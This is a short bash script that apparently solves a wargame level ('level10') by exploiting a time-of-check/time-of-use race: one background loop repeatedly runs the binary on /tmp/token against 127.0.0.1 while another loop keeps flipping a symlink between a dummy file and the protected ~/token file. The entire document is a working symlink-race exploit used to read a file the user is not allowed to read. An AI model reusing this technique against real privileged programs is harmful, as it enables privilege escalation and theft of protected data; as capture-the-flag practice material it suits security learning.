#!/bin/bash

echo '.*( )*.' > /tmp/fake

(while true
    do
        ~/level10 /tmp/token 127.0.0.1 &> /dev/null
    done
)&

(while true
    do
        ln -fs /tmp/fake /tmp/token;
        ln -fs ~/token /tmp/token;
    done
)&

echo 'ok'